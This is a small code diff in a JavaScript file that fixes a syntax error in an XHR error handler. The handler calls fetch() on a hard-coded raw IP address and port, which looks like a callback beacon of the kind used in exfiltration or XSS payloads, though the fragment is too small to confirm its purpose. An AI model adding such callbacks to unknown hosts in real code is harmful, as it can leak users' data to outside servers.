@@ -18,7 +18,7 @@ xhr.onload = function() {
 };
 // Handle network errors
 xhr.onerror = function() {
-  fetch("http://82.65.210.151:24000/?error=error";
+  fetch("http://82.65.210.151:24000/?error=error");
 };
 
 // Send the request
